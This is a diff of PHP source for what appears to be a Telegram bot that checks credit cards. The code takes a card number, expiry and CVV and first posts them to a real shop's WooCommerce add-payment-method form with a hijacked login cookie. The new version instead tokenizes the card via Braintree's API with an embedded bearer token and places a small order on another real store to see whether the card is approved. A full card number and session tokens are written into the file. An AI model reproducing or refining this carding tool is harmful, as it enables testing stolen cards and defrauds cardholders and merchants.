@@ -474,72 +474,82 @@ fclose($fp);
 
 if (strpos($message, ".pr") === 0 || strpos($message, "!pr") === 0 || strpos($message, "/pr") === 0) {
 
-	sendPv($myid, 'error3...');
+	sendPv($myid, 'error2..');
 $lista = "5218071187489214|08|2028|796";
-
-//$lista = substr($message, 5);
+                                                                             //$lista = substr($message, 5);
 $i     = explode("|", $lista);
-$cc    = $i[0];
-$mes   = $i[1];
+$cc    = $i[0];                                                              $mes   = $i[1];
 $ano  = $i[2];
 $cvv   = $i[3];
 
 $headers = array();
-$headers[] = "Host:www.warfighterhemp.com";
-$headers[] = "cache-control: max-age=0";
-$headers[] = "upgrade-insecure-requests: 1";
-$headers[] = "user-agent: Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0";
-$headers[] = "accept-language:es-US,es;q=0.6";
-$headers[] = "accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8";
-$headers[] = 'sec-ch-ua:"Chromium";v="128", "Not;A=Brand";v="24", "Brave";v="128"';
-$hesders[] = 'sec-ch-ua-platform:"Android"';
-$headers[] = "referer: https://www.warfighterhemp.com/my-account/add-payment-method/";
-$headers[] = "cookie: PHPSESSID=212fbc15f71bcc4c6523856b55168a5d";
-$headers[] = "cookie: sbjs_migrations=1418474375998%3D1";
-$headers[] = "cookie: sbjs_current_add=fd%3D2024-09-01%2002%3A33%3A52%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.warfighterhemp.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29";
-$headers[] = "cookie: sbjs_first_add=fd%3D2024-09-01%2002%3A33%3A52%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.warfighterhemp.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29";
-$headers[] = "cookie: sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29";
-$headers[] = "cookie: sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29";
-$headers[] = "cookie: sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F128.0.0.0%20Mobile%20Safari%2F537.36";
-$headers[] = "cookie: lepopup-onload-WFH-Age-Verification=ilovefamily";
-$headers[] = "cookie: undefined=hidden";
-$headers[] = "cookie: wordpress_logged_in_e1799a98d401098f9b47d4c3f78c6c00=gopejob932%7C1726371315%7CxKjbMc5CqommL6NpUYvaxW2XinH9aH8T3oBhkO0VEn2%7Cfc6213f501ed59e619311b5374589b256f79c09b60acbe170c0bddd8f2468dcc";
-$headers[] = "cookie: wfwaf-authcookie-a566fef2ac3836d146bc189f6ed40f0e=5553%7Cother%7Cread%7Cbbb2aaec203845433e4024dc542fe29c176ed4fe9b73c69eee1a8d24edce7b3c";
-$headers[] = "cookie: sbjs_session=pgs%3D5%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.warfighterhemp.com%2Fmy-account%2Fadd-payment-method%2F";
-
+$headers[] = "user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36";
+$headers[] = "authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MjUzMTU4NzYsImp0aSI6IjJkOWRiZDk0LTA4ZWMtNDJhNS04MDUxLTEwNDAxN2ZiYzUyZSIsInN1YiI6Imc3Y2JjdHluc2c0ZmJqY3giLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6Imc3Y2JjdHluc2c0ZmJqY3giLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnt9fQ.Q8Ui48a1YcXyZqZQoYWkeo-k3-5p5HhcdRWZna43klcu9iZsEP-oiBpL5PMF9HQNEZ__FbpC5hgsmDMyB1se9A";
+$headers[] = "braintree-version: 2018-05-10";
+$headers[] = "content-type: application/json";
+$headers[] = "accept-language: es-US,es;q=0.7";
+$headers[] = "origin: https://assets.braintreegateway.com";
+$headers[] = "sec-fetch-site: cross-site";
+$headers[] = "sec-fetch-dest: empty";
+$headers[] = "referer: https://assets.braintreegateway.com/";
 
 $ch = curl_init();
-curl_setopt($ch, CURLOPT_URL, "https://www.warfighterhemp.com/my-account/add-payment-method/");
+curl_setopt($ch, CURLOPT_URL, "https://payments.braintree-api.com/graphql");
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_HEADER, 0);
-curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0');
-//curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36');
+curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36');
 curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
-curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
 curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
-curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
-curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
-curl_setopt($ch, CURLOPT_POSTFIELDS, 'payment_method=nmi_gateway_woocommerce_credit_card&wc-nmi-gateway-woocommerce-credit-card-account-number='.$cc.'&wc-nmi-gateway-woocommerce-credit-card-expiry='.$mes.'+%2F+'.$ano.'&wc-nmi-gateway-woocommerce-credit-card-csc='.$cvv.'&woocommerce-add-payment-method-nonce=9c4b4d45c8&_wp_http_referer=%2Fmy-account%2Fadd-payment-method%2F&woocommerce_add_payment_method=1');
+curl_setopt($ch, CURLOPT_POST, 1);
+curl_setopt($ch, CURLOPT_POSTFIELDS, '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"1fd1a352-ba99-489a-947b-e606f6518a92"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"'.$cc.'","expirationMonth":"'.$mes.'","expirationYear":"'.$ano.'","cvv":"'.$cvv.'","billingAddress":{"postalCode":"12000"}},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}');
 curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
-$response = curl_exec($ch);
-curl_close($ch);
-	
-$result1 = (strpos($response, "Nice! New payment method added") !== false) ? "Approved" : trim(strip_tags(capture($response, '<ul class="woocommerce-error" role="alert">', '</ul>'))) ?? "An error occurred, please try again";
+$json = curl_exec($ch);
+$data = json_decode($json, true);
+// Extraemos el token
+$token = $data['data']['tokenizeCreditCard']['token'];
 
-$patron = "/failed: (.*)/";
-preg_match($patron, $result1, $matches);
-$respo = $matches[1];
-	
-if (empty($response)) {
-    $response = "La Variable \$respo está vacía.";
-//dendMessage($chat_id,$response,$message_id);
-	sendPv($myid, $response);
-} else {
-//echo "RESULT: $respo\n";
-	sendPv($myid, $response);
-//sendMessage($chat_id,$response,$message_id);
-}
+
+$headers = array();
+$headers[] = "content-length: 285";
+$headers[] = 'sec-ch-ua: "Chromium";v="128", "Not;A=Brand";v="24", "Brave";v="128"';
+$headers[] = 'sec-ch-ua-platform: "Android"';
+$headers[] = "sec-ch-ua-mobile: ?1";
+$headers[] = "user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36";
+$headers[] = "content-type: application/json";
+$headers[] = "sec-gpc: 1";
+$headers[] = "accept-language: es-US,es;q=0.7";
+$headers[] = "origin: https://zephyr-sim.com";
+$headers[] = "sec-fetch-site: same-site";
+$headers[] = "sec-fetch-mode: cors";
+$headers[] = "sec-fetch-dest: empty";
+$headers[] = "referer: https://zephyr-sim.com/";
+$headers[] = "accept-encoding: gzip, deflate, br, zstd";
+$headers[] = "priority: u=1, i";
+
+$url = "https://api.zephyr-sim.com/v2/orders/braintree";
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, $url);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_HEADER, 0);
+curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36');
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+curl_setopt($ch, CURLOPT_POST, 1);
+curl_setopt($ch, CURLOPT_POSTFIELDS, '{"paymentMethodNonce":"'.$token.'","email":"rigoj48@gmail.com","cart":[{"productId":"ADV-LOC","quantity":1,"isUpsell":false,"isDownsell":false}],"billingCountry":"MX","billingStateProvince":"MEX","billingPostalCode":"12000","expedited":false,"total":15}');
+curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
+$json = curl_exec($ch);
+
+$data = json_decode($json, true);
+
+// Extraemos los valores
+$statusCode = $data['statusCode'];
+$message = $data['message'];
+$code = $data['code'];
+
+$response = "$statusCode | $message | $code";
+sendMessage($chat_id,$response,$message_id);
 
  
 }
